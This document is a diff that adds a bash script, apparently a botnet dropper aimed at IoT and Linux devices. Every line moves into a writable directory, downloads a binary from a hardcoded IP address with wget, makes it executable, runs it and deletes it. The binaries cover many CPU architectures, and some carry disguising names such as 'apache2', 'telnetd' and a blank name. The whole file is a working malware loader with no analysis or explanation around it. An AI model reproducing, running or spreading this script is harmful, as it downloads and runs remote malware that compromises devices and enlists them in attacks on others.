@@ -1,0 +1,15 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/1Plex-MIPS; chmod +x 1Plex-MIPS; ./1Plex-MIPS; rm -rf 1Plex-MIPS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/1Plex-MIPSEL; chmod +x 1Plex-MIPSEL; ./1Plex-MIPSEL; rm -rf 1Plex-MIPSEL
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/1Plex-SH4; chmod +x 1Plex-SH4; ./1Plex-SH4; rm -rf 1Plex-SH4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/1Plex-X86; chmod +x 1Plex-X86; ./1Plex-X86; rm -rf 1Plex-X86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/1Plex-ARMV6; chmod +x 1Plex-ARMV6; ./1Plex-ARMV6; rm -rf 1Plex-ARMV6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/1Plex-I686; chmod +x 1Plex-I686; ./1Plex-I686; rm -rf 1Plex-I686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/1Plex-I586; chmod +x 1Plex-I586; ./1Plex-I586; rm -rf 1Plex-I586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/1Plex-M68K; chmod +x 1Plex-M68K; ./1Plex-M68K; rm -rf 1Plex-M68K
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/1Plex-ARMV41; chmod +x 1Plex-ARMV41; ./1Plex-ARMV41; rm -rf 1Plex-ARMV41
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/1Plex-ARMV51; chmod +x 1Plex-ARMV51; ./1Plex-ARMV51; rm -rf 1Plex-ARMV51
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/sh; chmod +x sh; ./sh; rm -rf sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.142.119/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
